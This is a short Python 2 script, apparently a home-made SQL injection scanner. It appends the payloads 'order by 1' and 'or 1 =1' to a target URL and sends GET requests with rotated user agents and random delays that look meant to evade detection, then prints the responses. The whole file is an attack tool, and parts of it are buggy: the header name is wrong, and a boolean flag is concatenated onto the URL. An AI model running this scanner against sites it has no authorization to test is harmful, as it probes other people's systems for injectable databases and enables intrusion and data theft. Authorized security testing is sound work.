#!/usr/bin/env python
#This script simple scans for sql injection targets

import requests
import sys
import argparse
import random
import pdb
import time

def sqli_test(url, payload=None):
	"""Runs a GET of an url
	using random user agents
	payload needs to be a well formed dict"""
	result = -1
	user_agent_list = ['Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko']	
	user_agent = user_agent_list[random.randint(0,1)]
	headers = {'user_agent': user_agent }
	if payload is None:
		try:
			result = requests.get(url, headers=headers)
		except Exception as msg:
			print '[!] ERROR: {} Can not GET from url {}'.format(msg,url)
			pass
	else:
		try:
			result = requests.get(url,headers=headers, params=payload)
		except Exception as msg:
			print '[!] ERROR: {} Can not GET from url {} with payload {}'.format(msg,url,payload)
			pass
	return result

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
B = '\033[34m' # blue

#Argument parsing
help_message = ("USAGE:\n" +
                "The sqli_scanner.py checks sqli injection\n" +
				"Example:\n" +
				"sqli_scanner.py -t url.com\n" +
				"sqli_scanner.py -t url.com -s some_sqli_params") 
parser = argparse.ArgumentParser(usage=help_message, description='Tests sqli injection')
parser.add_argument('-t', help='URL of the target host', default=False)
parser.add_argument('-s', help='sqli test', default=False, action='store_true')
args = parser.parse_args()

url = args.t
sqli = args.s

#SQLI tests
sqli_list = [ "1 order by 1", "jerry or 1 =1" ]

if __name__ == "__main__":
	
	print G + "[+] INFO: Starting check" + W

#	pdb.set_trace()

	if sqli:
		fullurl = url +  sqli
		print G + "[+] INFO: Trying {}".format(fullurl) + W
		result = sqli_test(fullurl)
		print G + "[+] INFO: Output is: " +W
		if result == -1 :
			print R + "[!] ERROR: Could not get url" + W
		elif result.ok:
			print result.text
		else:
			print R + "[!] ERROR: Unknown error" + W	
	
	else:
		for sqli in sqli_list:
			time.sleep(random.randint(0,15))
			fullurl = url + sqli
			print fullurl
			print G + "[+] INFO: Trying {}".format(fullurl) + W
			result = sqli_test(fullurl)
			print G + "[+] INFO: Output is:" +W
			if result == -1 :
				print R + "[!] ERROR: Could not get url" + W
			elif result.ok:
				print result.text
			else:
				print R +"[!] ERROR: Unknown error" + W

